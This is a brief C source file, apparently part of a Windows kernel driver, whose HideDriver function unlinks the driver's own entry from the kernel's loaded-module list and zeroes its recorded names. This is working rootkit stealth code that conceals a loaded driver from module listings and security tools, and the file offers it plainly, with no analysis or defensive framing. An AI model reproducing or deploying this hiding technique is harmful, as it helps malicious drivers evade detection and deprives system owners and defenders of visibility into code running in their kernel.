#include "common.h"
#include "hiding.h"

void HideDriver() {
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)g_DeviceObject->DriverObject->DriverSection;
    if (entry) {
        RemoveEntryList(&entry->InLoadOrderLinks);
        RtlZeroMemory(&entry->BaseDllName, sizeof(UNICODE_STRING));
        RtlZeroMemory(&entry->FullDllName, sizeof(UNICODE_STRING));
    }
}